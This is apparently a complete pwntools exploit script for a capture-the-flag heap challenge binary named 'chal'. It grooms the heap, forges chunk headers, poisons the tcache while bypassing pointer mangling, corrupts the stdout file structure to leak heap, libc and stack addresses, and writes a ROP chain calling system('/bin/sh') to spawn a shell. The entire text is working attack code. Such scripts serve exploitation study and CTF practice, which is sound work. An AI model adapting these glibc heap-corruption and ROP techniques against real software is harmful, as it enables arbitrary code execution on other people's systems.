#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chal')
libc = ELF(exe.libc.path) if exe.libc else None

def start(argv=[], *a, **kw):
  if args.GDB: return gdb.debug([exe.path]+argv, gdbscript=gdbscript, *a, **kw)
  else: return process([exe.path]+argv, *a, **kw)

def alloc(is_snalloc, idx, size):
  assert 0 <= idx < 0x1000
  assert 0 <= size <= 0x100
  io.sendlineafter(b'> ', b'1')
  io.sendlineafter(b'> ', b'1' if not is_snalloc else b'2')
  io.sendlineafter(b'> ', str(idx).encode())
  io.sendlineafter(b'> ', str(size).encode())

def edit(is_snalloc, idx, data=b'\n'):
  assert 0 <= idx < 0x1000
  io.sendlineafter(b'> ', b'2')
  io.sendlineafter(b'> ', b'1' if not is_snalloc else b'2')
  io.sendlineafter(b'> ', str(idx).encode())
  io.sendafter(b'> ', data)

def free(is_snalloc, idx):
  assert 0 <= idx < 0x1000
  io.sendlineafter(b'> ', b'3')
  io.sendlineafter(b'> ', b'1' if not is_snalloc else b'2')
  io.sendlineafter(b'> ', str(idx).encode())

gdbscript = \
f'''
init-pwndbg
c
'''

io = start()

for i in range(7): alloc(False, i, 0xf8)
for i in range(7): alloc(False, 7+i, 0x100)

t = (0x310+(0x100+0x110)*7)%0x1000
for i in range((0x1000-t)//0x100): alloc(False, 0xff, 0xf8)
if t % 0x100 != 0: alloc(False, 0xff, ((0x1000-t)%0x100)-0x8)

for i in range(16): alloc(False, 0x10+i, 0xf8)

alloc(False, 0xff, 0xf8)
edit (False, 0xff, p64(0)*2+p64(1)*2+b'\n')
free (False, 0xff)
alloc(False, 0xff, 0xf8)

for i in range(7): free(False, i)

free (False, 0xff)
free (False, 0x1f)
alloc(False, 0x1f, 0x100)
edit (False, 0x1f, p64(0)*0x1f+p64((0x2010+0x20)|1))

for i in range(7): free(False, 7+i)
for i in range(16): free(False, 0x10+i)
for i in range(7): alloc(False, i, 0xf8)
for i in range(7): alloc(False, 7+i, 0x100)

for _ in range(0x1000//0x80): alloc(True, 0xff, 0x80)
alloc(True, 0, 0x80)

for i in range(7):
  alloc(False, 0x20+i, 0xe8)
  alloc(False, 0xff, 0x18)
for i in range(7): alloc(False, 0x27+i, 0xe8)
edit(False, 0x20, (p64(0)*3+p64(0x20|1))*2+b'\n')

for i in range(7): free(False, 0x27+i)
for i in range(6, -1, -1): free(False, 0x20+i)

free(True, 0)

for i in range((0x2000//0x100)-1): alloc(False, 0xff, 0xf8)
alloc(False, 0xff, 0xd8)
alloc(False, 0x30, 0x48)
edit (False, 0x30, p64(0)*5+p64(0xa0|1)+p64(0)+p16(0xa<<12|(libc.sym._IO_2_1_stdout_-0x40)&0xfff)+b'\n')

for i in range(7): alloc(False, 0x27+i, 0xe8)
alloc(False, 0x26, 0xe8)
alloc(False, 0x25, 0xe8)
edit (False, 0x25, p64(0)*6+p64(0xfbad1800)+p64(0)*3+p16(0x9000)+b'\n')

leaks = io.recvuntil(b'1 - ')
heap_base = u64(leaks[0x1e0:][:8])
libc.address = u64(leaks[0x3a0:][:8]) - 0x1b08c8
log.success(f'{heap_base = :#x}')
log.success(f'{libc.address = :#x}')

edit(False, 0x25, p64(0)*6+p64(0xfbad1800)+p64(libc.address+0x20a643)*4+p16(0xb000)+b'\n')
stack = u64(io.recvuntil(b'1 - ')[0x9d:][:8])
log.success(f'{stack = :#x}')

''' 0x00193e1d: pop rdi; pop rbp; ret; '''
edit (False, 0x30, p64(0)*5+p64(0xa0|1)+p64((stack-0x158-0x10)^((heap_base+0x5010)>>12))+b'\n')
alloc(False, 0x24, 0xe8)
alloc(False, 0x23, 0xe8)
edit (False, 0x23, p64(0)*3+p64(libc.address+0x193e1d)+p64(next(libc.search(b'/bin/sh\x00')))+p64(0)+p64(libc.sym.system)+b'\n')

io.interactive()
